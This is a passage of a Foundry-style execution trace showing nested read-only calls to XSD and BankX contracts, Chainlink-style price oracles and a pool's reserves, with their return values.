    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [352] 0x2946Ca638EB11830E83Feaa130aA8B13d37C3772::collat_XSD()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000015b42616817e3414b
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [407] XSD::global_collateral_ratio() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000000000f4240
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5656] XSD::xag_usd_price() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4162] 0x25E084A3B5dAb1F8272BBcC9E2935430069DB8Ff::getLatestPrice() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3143] 0x817326922c909b16944817c207562B25C4dF16aD::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1410] 0x168f55dFe619E37fe2393c3bA3c831647F8617c0::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 125646 [1.256e5], 2287435000 [2.287e9], 1695752859 [1.695e9], 1695752859 [1.695e9], 125646 [1.256e5]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147419228878 [3.689e19], 2287435000 [2.287e9], 1695752859 [1.695e9], 1695752859 [1.695e9], 36893488147419228878 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000088577cf8
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000000015d08ee
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [369] XSDWETHpool::getReserves() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3963937398991055853792 [3.963e21], 3857071215838228063464 [3.857e21], 1695753429 [1.695e9]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5656] XSD::xag_usd_price() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4162] 0x25E084A3B5dAb1F8272BBcC9E2935430069DB8Ff::getLatestPrice() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3143] 0x817326922c909b16944817c207562B25C4dF16aD::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1410] 0x168f55dFe619E37fe2393c3bA3c831647F8617c0::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 125646 [1.256e5], 2287435000 [2.287e9], 1695752859 [1.695e9], 1695752859 [1.695e9], 125646 [1.256e5]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147419228878 [3.689e19], 2287435000 [2.287e9], 1695752859 [1.695e9], 1695752859 [1.695e9], 36893488147419228878 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000088577cf8
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000000015d08ee
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5620] XSD::eth_usd_price() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4162] 0xfa2dcD1aaA0E3dB79A2e3b2aDb1e286C27b5cE75::getLatestPrice() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3143] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1410] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3031251 [3.031e6], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 3031251 [3.031e6]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147422134483 [3.689e19], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 36893488147422134483 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000004ede22f38
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000000000000000c9e6bfe
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5656] XSD::xag_usd_price() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4162] 0x25E084A3B5dAb1F8272BBcC9E2935430069DB8Ff::getLatestPrice() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3143] 0x817326922c909b16944817c207562B25C4dF16aD::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1410] 0x168f55dFe619E37fe2393c3bA3c831647F8617c0::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 125646 [1.256e5], 2287435000 [2.287e9], 1695752859 [1.695e9], 1695752859 [1.695e9], 125646 [1.256e5]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147419228878 [3.689e19], 2287435000 [2.287e9], 1695752859 [1.695e9], 1695752859 [1.695e9], 36893488147419228878 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000088577cf8
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000000015d08ee
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [369] XSDWETHpool::getReserves() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3963937398991055853792 [3.963e21], 3857071215838228063464 [3.857e21], 1695753429 [1.695e9]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [7181] XSD::xsd_price() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4162] 0xfa2dcD1aaA0E3dB79A2e3b2aDb1e286C27b5cE75::getLatestPrice() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3143] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1410] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3031251 [3.031e6], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 3031251 [3.031e6]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147422134483 [3.689e19], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 36893488147422134483 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000004ede22f38
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [369] XSDWETHpool::getReserves() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3963937398991055853792 [3.963e21], 3857071215838228063464 [3.857e21], 1695753429 [1.695e9]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000000000000000c9e6bfe
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [7181] XSD::xsd_price() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4162] 0xfa2dcD1aaA0E3dB79A2e3b2aDb1e286C27b5cE75::getLatestPrice() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3143] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1410] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3031251 [3.031e6], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 3031251 [3.031e6]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147422134483 [3.689e19], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 36893488147422134483 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000004ede22f38
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [369] XSDWETHpool::getReserves() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3963937398991055853792 [3.963e21], 3857071215838228063464 [3.857e21], 1695753429 [1.695e9]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000000000000000c9e6bfe
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5620] XSD::eth_usd_price() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4162] 0xfa2dcD1aaA0E3dB79A2e3b2aDb1e286C27b5cE75::getLatestPrice() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3143] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1410] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3031251 [3.031e6], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 3031251 [3.031e6]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147422134483 [3.689e19], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 36893488147422134483 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000004ede22f38
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000000000000000c9e6bfe
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [7181] XSD::xsd_price() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4162] 0xfa2dcD1aaA0E3dB79A2e3b2aDb1e286C27b5cE75::getLatestPrice() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3143] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1410] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3031251 [3.031e6], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 3031251 [3.031e6]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147422134483 [3.689e19], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 36893488147422134483 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000004ede22f38
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [369] XSDWETHpool::getReserves() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3963937398991055853792 [3.963e21], 3857071215838228063464 [3.857e21], 1695753429 [1.695e9]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000000000000000c9e6bfe
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5656] XSD::xag_usd_price() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4162] 0x25E084A3B5dAb1F8272BBcC9E2935430069DB8Ff::getLatestPrice() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3143] 0x817326922c909b16944817c207562B25C4dF16aD::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1410] 0x168f55dFe619E37fe2393c3bA3c831647F8617c0::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 125646 [1.256e5], 2287435000 [2.287e9], 1695752859 [1.695e9], 1695752859 [1.695e9], 125646 [1.256e5]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147419228878 [3.689e19], 2287435000 [2.287e9], 1695752859 [1.695e9], 1695752859 [1.695e9], 36893488147419228878 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000088577cf8
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000000015d08ee
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [405] XSD::totalSupply() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 20000547033338243084561810 [2e25]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [369] XSDWETHpool::getReserves() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3963937398991055853792 [3.963e21], 3857071215838228063464 [3.857e21], 1695753429 [1.695e9]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5620] XSD::eth_usd_price() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4162] 0xfa2dcD1aaA0E3dB79A2e3b2aDb1e286C27b5cE75::getLatestPrice() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3143] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1410] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3031251 [3.031e6], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 3031251 [3.031e6]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147422134483 [3.689e19], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 36893488147422134483 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000004ede22f38
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000000000000000c9e6bfe
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3200] 0xED024d771261D765B9Dc7b0947ef271ea006248F::allocatedSupply() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2384] 0xE97E0f2a6f70176c757c82b5c392f93C34D99fA8::allocatedSupply() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [395] 0x2946Ca638EB11830E83Feaa130aA8B13d37C3772::bankx_minted_count() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [327] 0x4d369BD339709021267E92702A9E4cE30be85706::totalSupply() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 472721303262100063425570406 [4.727e26]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000001941a47e04bc64e
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000001941a47e04bc64e
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [7233] XSD::bankx_price() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4162] 0xfa2dcD1aaA0E3dB79A2e3b2aDb1e286C27b5cE75::getLatestPrice() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3143] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1410] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3031251 [3.031e6], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 3031251 [3.031e6]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147422134483 [3.689e19], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 36893488147422134483 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000004ede22f38
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [369] 0x224E13D9eAB11eDc09411ef4bF800791a7EF6135::getReserves() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 1347232252051346746666523 [1.347e24], 2600871202054432854 [2.6e18], 1695753429 [1.695e9]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000198
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [369] 0x224E13D9eAB11eDc09411ef4bF800791a7EF6135::getReserves() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 1347232252051346746666523 [1.347e24], 2600871202054432854 [2.6e18], 1695753429 [1.695e9]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5620] XSD::eth_usd_price() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4162] 0xfa2dcD1aaA0E3dB79A2e3b2aDb1e286C27b5cE75::getLatestPrice() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3143] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1410] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3031251 [3.031e6], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 3031251 [3.031e6]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147422134483 [3.689e19], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 36893488147422134483 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000004ede22f38
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000000000000000c9e6bfe
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5656] XSD::xag_usd_price() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4162] 0x25E084A3B5dAb1F8272BBcC9E2935430069DB8Ff::getLatestPrice() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3143] 0x817326922c909b16944817c207562B25C4dF16aD::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1410] 0x168f55dFe619E37fe2393c3bA3c831647F8617c0::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 125646 [1.256e5], 2287435000 [2.287e9], 1695752859 [1.695e9], 1695752859 [1.695e9], 125646 [1.256e5]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147419228878 [3.689e19], 2287435000 [2.287e9], 1695752859 [1.695e9], 1695752859 [1.695e9], 36893488147419228878 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000088577cf8
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000000015d08ee
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [352] 0x2946Ca638EB11830E83Feaa130aA8B13d37C3772::collat_XSD()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000015b42616817e3414b
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [7606] 0x2946Ca638EB11830E83Feaa130aA8B13d37C3772::collatDollarBalance() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5620] XSD::eth_usd_price() [staticcall]
